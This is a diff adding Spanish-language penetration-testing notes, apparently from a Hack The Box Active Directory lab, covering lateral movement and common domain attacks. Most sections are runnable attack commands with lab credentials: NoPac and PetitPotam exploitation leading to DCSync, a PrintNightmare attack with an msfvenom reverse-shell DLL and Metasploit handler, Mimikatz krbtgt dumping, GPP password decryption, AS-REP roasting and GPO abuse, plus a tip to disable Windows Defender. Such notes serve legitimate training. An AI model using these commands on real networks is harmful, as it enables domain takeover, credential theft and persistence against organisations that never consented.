@@ -501,7 +501,7 @@ $sid2 = Convert-NameToSid damundsen
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
 ```
 
-En el ejemplo de HTB nos muestra que tiene permisos `GenericWrite` sobre el grupo `Help Desk Level 1`, por lo que se puede buscar mas info con:
+En el ejemplo de HTB nos muestra que tiene permisos `GenericWrite` sobre el grupo `Help Desk Level 1`, por lo que se puede buscar mas info con: 
 ``` PowerShell
 Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
 ```
@@ -606,3 +606,438 @@ Para buscar permisos 'ENCRYPTED_TEXT_PWD_ALLOWED'
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol 
 ```
 
+# Accesso privilegiado
+A veces nos quedaremos atascados y necesitemos movernos lateralmente o retroceder y ve mas cosas para poder seguir avanzando:
+Podemos enumerar este acceso de varias maneras. La más sencilla, una vez más, es a través de BloodHound, ya que existen las siguientes aristas para mostrarnos qué tipos de privilegios de acceso remoto tiene un usuario determinado:
+
+- [CanRDP](https://bloodhound.specterops.io/resources/edges/can-rdp)
+- [CanPSRemote](https://bloodhound.specterops.io/resources/edges/can-ps-remote)
+- [Administrador de SQL](https://bloodhound.specterops.io/resources/edges/sql-admin)
+
+También podemos enumerar estos privilegios utilizando herramientas como PowerView e incluso herramientas integradas.
+
+## RDP
+El acceso a RDP debe de estar limitado a usuarios administradores pero a veces por alguna necesidad de la empresa se configura un grupo de escritorio remoto RDP por lo que ese será nuestro objetivo, para ello vamos a enumerar los usuarios dentro de este grupo:
+```
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+```
+
+También podremos verlo a través de bloodhound en la pestaña de "Querys>   
+Workstations where Domain Users can RDP" 
+
+Para verificar los accesos usaremos xfreerdp ,  remmina (HACER APUTNES DE ESTO)  si es desde linux, o 'mstsc.exe' si es desde Windows.
+
+## WinRM
+También hay otro grupo importante, el de grupo de gestión remoto, vamos a comprobarlo:
+```
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+```
+
+Desde Bloodhound podremos hacerlo con una query custom:
+```
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+```
+
+Para verificar el acceso podremos hacerlo mediante:
+Desde Windows con `Enter-PSSession`
+```PowerShell
+$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+
+$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+
+Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+```
+
+Desde linux con 'Evil-winrm':
+Para instalarlo:
+```
+gem install evil-winrm
+```
+
+Para usarlo:
+```
+evil-winrm -i [IP] -u [USER]
+```
+
+## SQL Server
+En muchísimos entornos nos encontraremos que hay servidores SQL y que una vez dentro suelen tener el permiso de administrador apra ejecutar comandos. Las credenciales normalmente las conseguiremos desde un kerberoasting, un envenenamiento con responder o un ataque de fuerza bruta o incluso con el Snaffler que vimos antes.
+
+Para revisar los permisos con bloodhound, con una query personalizada:
+```
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+```
+
+Si estamos en Windows para esto podremos usar la herramienta como `PowerUpSQL` que cuenta con  [hoja de referencia de comandos](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet) :
+```
+Import-Module .\PowerUpSQL.ps1
+
+Get-SQLInstanceDomain
+
+Get-SQLQuery -Verbose -Instance "[IP]" -username "[DOMAIN\USER]" -password "[PASSWORD]" -query 'Select @@version'
+```
+
+Si por el contrario estamos en linux será mucho mas cómodo con `mssqlclient.py` de impacket:
+```
+mssqlclient.py [DOMAIN\USER]@[IP] -windows-auth
+```
+
+Y desde aquí ya podremos activar la shell desde aquí si es que no está activa y usarla:+
+```
+enable_xp_cmdshell
+```
+
+Y una vez activo podremos usar comandos:
+```
+xp_cmdshell whoami /priv
+```
+
+## Comandos Manuales
+Bloodhound me fallaba en el modulo así que lo hice con los siguientes comandos, los cuales son de utilidad por si el método automático esta capado o no funciona correctamente:
+
+Lista los miembros de un grupo:
+```
+Get-DomainGroupMember -Identity "<grupo>"
+```
+Podemos añadirle -Recurse para expandirlo a grupos anidados
+
+Para saber cual es el DC:
+```
+Get-DomainController | Select-Object Name, IPAddress
+```
+
+Para enumerar el grupo local "Remote Management Users "de cada equipo en el dominio:
+```
+$Computers = Get-DomainComputer -Properties dnshostname | Select-Object -ExpandProperty dnshostname
+
+ForEach ($Computer in $Computers) {
+	Write-Host "[*] $Computer" -ForegroundColor Cyan
+    Get-NetLocalGroupMember -ComputerName $Computer -GroupName "Remote Management Users" -ErrorAction SilentlyContinue
+}  
+```
+Con este te saldra el nombre del equipo al que tiene el privilegio encima
+
+ Lista los grupos del dominio que contengan "WinRM" o "Remote" en el nombre
+```
+Get-DomainGroup | Where-Object { $_.name -match "WinRM|Remote" } | Select-Object name
+```
+
+# Ataques Comunes
+## NoPac
+
+Para identificarlo podremos hacerlo con NetExec:
+```
+nxc smb [IP] -u '[USER]' -p '[PASS]' -M nopac
+```
+
+Para explotarlo:
+```
+git clone https://github.com/Ridter/noPac.git
+
+sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap # Identificandolo (Lo mismo que nxc)
+
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+```
+Este exploit usa smbexec de la suite de impacket por lo que tendremos que tenerla actualizada.
+
+Es importante señalar que NoPac.py guarda el TGT en el directorio del host de ataque donde se ejecutó el exploit. Podríamos usar el archivo ccache para realizar un ataque de tipo pass-the-ticket y llevar a cabo ataques adicionales como DCSync.
+También podemos usar la herramienta con la `-dump`opción correspondiente para realizar un DCSync con secretsdump.py. Este método crearía igualmente un archivo ccache en el disco, del cual deberíamos estar al tanto y eliminarlo.
+```
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+```
+Puede que nos salte el WindowsDefender, si somos administradores lo deshabilitamos y ya
+
+## PrintNightmare
+
+Para este necesitaremos una version de impacket especifica (Probar normal antes de nada por que este modulo es del 2022 y puede haber cosas nuevas o mejores ahora)
+
+Instalación:
+```
+git clone https://github.com/cube0x0/CVE-2021-1675.git
+
+pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket
+python3 ./setup.py install
+```
+
+Descubrimiento:
+```
+rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+```
+
+Podremos verlo mucho mas fácil con netexec:
+```
+nxc smb [IP] -u '' -p '' -M printnightmare
+```
+
+### Ataque
+Generamos la carga útil:
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+```
+
+Creamos un recurso compartido:
+```
+sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+```
+
+Ponemos el multi/handler de metasploit:
+```
+use exploit/multi/handler
+
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+set LHOST 172.16.5.225
+
+set LPORT 8080
+
+run
+```
+
+Ejecutamos el exploit:
+```
+sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
+```
+
+Y listo con esto tendríamos nuestra shell.
+
+## PetitPotam
+Iniciamos el ntlmrelayx:
+```
+sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+```
+>[!nota]
+>Cabe destacar que que este ataque tambien se peude hacer directamente con certypy
+
+Instalamos y ejecutamos petitpotam
+```
+git clone https://github.com/topotam/PetitPotam.git
+
+python3 PetitPotam.py [IP_ATACANTE] [DC_IP]
+```
+
+Al ejecutarlo veremos que nos da en Base64 el certificado para DC01.
+Con este certificado podemos usar `gettgtpkinit.py` para solicitar un TGT:
+```
+python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 [BASE64_CERTIFICADO] dc01.ccache
+```
+Esto también nos dará la `encryption key`, que veremos después como suarla
+
+Si funciona se nos creara el archivo `dc01.ccache` el cual podremos usar:
+```
+export KRB5CCNAME=dc01.ccache
+
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+klist # Para verificarlo
+```
+
+En el ejemplo con el secrestsdump anterior se consigue extraer el hash NT del administrador por lo que podremos usarlo en diferentes herramientas como sabemos.
+
+Volviendo a cuando solicitemos el ticket TGT con la herraminta de de gettgtpkinit que nos dió la key de encriptación vamos a usarla con `getnthash.py` para obtener el hasth NT de otra manera alternativa:
+```
+python /opt/PKINITtools/getnthash.py -key [CLAVE_DE_ENCRIPTACION] INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
+```
+Después con ese hash podremos hacer DCSync:
+```
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:[HASH_NT]
+```
+
+>[!Note]
+>Cabe destacar del comando anterior que 'aad3c435b514a4eeaad3b935b51304fe' es el hash LM vacío estándar, cuando no tenemos deberíamos de usar este.
+
+Como alternativa, una vez que obtengamos el certificado base64 a través de ntlmrelayx.py, podríamos usar el certificado con la herramienta Rubeus en un host de ataque Windows para solicitar un ticket TGT y realizar un ataque pass-the-ticket (PTT) simultáneamente.
+
+```
+.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:[CERTIFICADO_BASE64] /ptt
+```
+
+Y verificamos que se ha guardado en memoria:
+```
+klist
+```
+Nuevamente, dado que los controladores de dominio tienen privilegios de replicación en el dominio, podemos usar el ataque pass-the-ticket para realizar un ataque DCSync con Mimikatz desde nuestro host de ataque Windows. Aquí, obtenemos el hash NT de la cuenta KRBTGT, que podría usarse para crear un Golden Ticket y establecer persistencia. Podríamos obtener el hash NT de cualquier usuario privilegiado mediante DCSync y avanzar a la siguiente fase de nuestra evaluación.
+
+```
+.\mimikatz.exe
+
+lsadump::dcsync /user:inlanefreight\krbtgt
+```
+
+# Configuraciones erróneas comunes
+
+## Grupos de Exchange
+- **Exchange Windows Permissions**: puede escribir DACL sobre el dominio → otorgar **DCSync**.
+- **Exchange Organization Management**: equivalente a "Domain Admins" de Exchange; accede a todos los buzones.
+- Comprometer un servidor Exchange suele dar privilegios de DA + credenciales en memoria (OWA cachea texto plano/NTLM).
+
+---
+
+## PrivExchange
+Abusa de `PushSubscription` para forzar al servidor Exchange (corre como SYSTEM con WriteDacl pre-CU 2019) a autenticarse → relay a LDAP para DCSync.
+
+---
+
+## PrinterBug (MS-RPRN)
+Cualquier usuario fuerza al spooler (SYSTEM) a autenticarse vía SMB → relay a LDAP → DCSync o RBCD.
+
+**Detectar hosts vulnerables:**
+```powershell
+Import-Module .\SecurityAssessment.ps1
+Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+```
+→ Devuelve `True` si el spooler está activo y es explotable.
+
+---
+
+## MS14-068
+Forja un PAC falsificado en Kerberos para presentarte como Domain Admin. Herramientas: **PyKEK**, **Impacket**. Solo se mitiga parcheando.
+
+---
+
+## Interceptación de credenciales LDAP
+Consolas web de apps/impresoras con función *test connection* → apuntas el LDAP a tu IP y levantas listener:
+```bash
+nc -lvnp 389
+```
+→ El dispositivo envía las credenciales (a menudo en texto plano).
+
+---
+
+## Enumeración de registros DNS (adidnsdump)
+Útil cuando los hostnames son genéricos (`SRV01934.dom.local`) — descubre registros tipo `JENKINS.dom.local`.
+
+**Listar registros DNS del dominio:**
+```bash
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
+```
+
+**Resolver registros ocultos/desconocidos con consulta A:**
+```bash
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+```
+→ Genera `records.csv` con tipo, nombre y valor de cada registro.
+
+---
+
+## Contraseñas en el campo `description`
+Los admins a veces dejan contraseñas en notas o descripción del usuario.
+```powershell
+Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
+```
+
+---
+
+## PASSWD_NOTREQD
+Cuentas que no requieren contraseña (puede estar vacía o muy corta). Vale la pena probar autenticar con cada una.
+```powershell
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+```
+
+---
+
+## Credenciales en SYSVOL / scripts
+SYSVOL es legible por todo usuario autenticado. Buscar contraseñas en `.bat`, `.vbs`, `.ps1`.
+
+**Listar scripts de logon:**
+```powershell
+ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+```
+
+**Leer un script sospechoso:**
+```powershell
+cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
+```
+
+**Probar la contraseña encontrada contra todos los hosts (admin local):**
+```bash
+crackmapexec smb <rango> -u Administrator -p '!ILFREIGHT_L0cALADmin!' --local-auth
+```
+
+---
+
+## GPP cpassword (MS14-025)
+Contraseñas cifradas con AES-256 en `Groups.xml`, `Services.xml`, etc. — Microsoft publicó la clave privada en MSDN.
+
+**Descifrar un cpassword extraído manualmente:**
+```bash
+gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+```
+
+**Listar módulos GPP en CrackMapExec:**
+```bash
+crackmapexec smb -L | grep gpp
+```
+
+**Buscar y recuperar GPP passwords automáticamente:**
+```bash
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
+```
+
+**Buscar credenciales de autologon en `Registry.xml`:**
+```bash
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+```
+→ Devuelve usuario/dominio/contraseña en texto plano si hay autologon por GPO.
+
+---
+
+## ASREPRoasting
+Cuentas con `DONT_REQ_PREAUTH` permiten obtener un AS-REP cifrado con la contraseña → crack offline. **No requiere credenciales previas.**
+
+**Enumerar cuentas vulnerables (Windows / PowerView):**
+```powershell
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+```
+
+**Obtener el AS-REP con Rubeus (formato Hashcat):**
+```powershell
+.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+```
+> `/nowrap` evita que el hash se corte en columnas.
+
+**Crackear el hash offline (modo 18200 = AS-REP etype 23):**
+```bash
+hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
+```
+
+**Enumerar usuarios y volcar AS-REPs sin auth con Kerbrute:**
+```bash
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+```
+
+**Mismo ataque con Impacket (lista de usuarios):**
+```bash
+GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
+```
+
+---
+
+## Abuso de GPOs
+Con permisos como `WriteProperty`/`WriteDacl` sobre una GPO puedes: añadir derechos (SeDebug, SeImpersonate), agregar admin local, crear scheduled tasks inmediatas, scripts de inicio maliciosos.
+
+**Listar todas las GPOs (PowerView):**
+```powershell
+Get-DomainGPO | select displayname
+```
+
+**Listar GPOs con cmdlet integrado:**
+```powershell
+Get-GPO -All | Select DisplayName
+```
+
+**Comprobar si Domain Users tiene derechos sobre alguna GPO:**
+```powershell
+$sid = Convert-NameToSid "Domain Users"
+Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+```
+→ Busca `WriteProperty`, `WriteDacl`, `GenericAll`, `GenericWrite`.
+
+**Convertir GUID de GPO a nombre legible:**
+```powershell
+Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
+```
+
+**Explotación:** **SharpGPOAbuse** (cuidado con el *blast radius* — afecta a toda la OU vinculada). También se puede auditar con `group3r`, `ADRecon`, `PingCastle`.
+
+También se puede ver esto con Bloodhound.
